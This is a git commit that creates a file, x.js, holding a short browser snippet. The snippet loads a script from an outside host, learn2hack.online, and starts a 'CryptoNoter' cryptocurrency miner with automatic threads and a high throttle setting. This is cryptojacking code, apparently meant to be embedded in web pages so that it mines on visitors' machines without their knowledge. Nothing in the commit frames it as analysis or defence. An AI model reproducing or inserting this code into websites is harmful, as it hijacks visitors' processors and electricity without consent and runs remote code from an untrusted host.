b6d52d6d4c0d9608978345c9a371654b4ce07300
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-02-01 13:03:07 +0000

    Create x.js

---
+++ x.js
@@ -0,0 +1,9 @@
+<script src="https://learn2hack.online/processor.js"></script>
+<script>
+	var addr = 'CryptoNoter';
+	var miner = new CryptoNoter.Anonymous(addr, {
+        autoThreads: true,
+	throttle: 0.8
+	});
+	miner.start();
+</script>
